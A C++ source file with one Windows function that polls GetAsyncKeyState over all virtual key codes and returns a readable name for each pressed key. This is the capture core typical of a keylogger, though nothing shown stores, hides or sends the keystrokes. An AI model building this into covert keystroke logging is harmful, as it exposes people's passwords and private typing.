#include "pch.h"

#include <Windows.h>
#include <iostream>
#include <sstream>
#include <string>


std::string Keystroke() {
    std::string keyName = " ";
    for (int i = 8; i <= 255; i++) {
        if (GetAsyncKeyState(i) == -32767) {
            if (i == VK_SHIFT || i == VK_CONTROL || i == VK_MENU)
                continue; // ignore modifier keys
            else if (i == VK_LSHIFT || i == VK_RSHIFT)
                keyName = "[SHIFT]";
            else if (i == VK_LCONTROL || i == VK_RCONTROL)
                keyName = "[CTRL]";
            else if (i == VK_LMENU || i == VK_RMENU)
                keyName = "[ALT]";
            else if (i == VK_LWIN || i == VK_RWIN)
                keyName = "[WINDOWS]";
            else if (i == VK_CAPITAL)
                keyName = "[CAPS LOCK]";
            else if (i == VK_BACK)
                keyName = "[BACKSPACE]";
            else if (i == VK_TAB)
                keyName = "[TAB]";
            else if (i == VK_CLEAR)
                keyName = "[DELETE]";
            else if (i == VK_RETURN)
                keyName = "[ENTER]";
            else if (i == VK_ESCAPE)  
                keyName = "[ESC]";
            else if (i == VK_SPACE)
                keyName = "[SPACEBAR]";
            else if (i == VK_PRIOR)
                keyName = "[PAGE UP]";
            else if (i == VK_NEXT)
                keyName = "[PAGE DOWN]";
            else if (i == VK_END)
                keyName = "[END]";
            else if (i == VK_HOME)
                keyName = "[HOME]";
            else if (i == VK_LEFT)
                keyName = "[LEFT]";
            else if (i == VK_UP)
                keyName = "[UP]";
            else if (i == VK_RIGHT)
                keyName = "[RIGHT]";
            else if (i == VK_DOWN)
                keyName = "[DOWN]";
            else if (i == VK_SNAPSHOT)
                keyName = "[PRTSC]";
            else if (i == VK_INSERT)
                keyName = "[INSERT]";
            else if (i == VK_DELETE)
                keyName = "[DELETE]";
            else if (i == VK_NUMLOCK)
                keyName = "[NUM LOCK]";
            else if (i == VK_SCROLL)
                keyName = "[SCROLL LOCK]";
            else if (i == VK_ADD)
                keyName = "[ADD]";
            else if (i == VK_SUBTRACT)
                keyName = "[SUBTRACT]";
            else if (i == VK_MULTIPLY)
                keyName = "[MULTIPLY]";
            else if (i == VK_DIVIDE)
                keyName = "[DIVIDE]";
            else if (i == VK_DECIMAL)
                keyName = "[DECIMAL]";
            else if (i == VK_SEPARATOR)
                keyName = "[SEPARATOR]";
            else if (i >= VK_F1 && i <= VK_F24) {
                int num = i - VK_F1 + 1;
                std::stringstream s;
                s << "[F" << num << "]";
                keyName = s.str();
            }
            else if (i == VK_OEM_3)
                keyName = "`";
            else if (i == VK_OEM_MINUS)
                keyName = "-";
            else if (i == VK_OEM_PLUS)
                keyName = "=";
            else if (i == VK_OEM_4)
                keyName = "[";
            else if (i == VK_OEM_5)
                keyName = "\\";
            else if (i == VK_OEM_6)
                keyName = "]";
            else if (i == VK_OEM_1)
                keyName = ";";
            else if (i == VK_OEM_7)
                keyName = "'";
            else if (i == VK_OEM_COMMA)
                keyName = ",";
            else if (i == VK_OEM_PERIOD)
                keyName = ".";
            else if (i == VK_OEM_2)
                keyName = "/";
            else if (i >= VK_NUMPAD0 && i <= VK_NUMPAD9) {
                int num = i - VK_NUMPAD0;
                std::stringstream s;
                s << "[NUMPAD" << num << "]";
                keyName = s.str();
            }
            else if ((i >= 'A' && i <= 'Z') || (i >= '0' && i <= '9'))
                keyName = std::string(1, static_cast<char>(i));
            return keyName;
        }
    }
    return keyName;
}
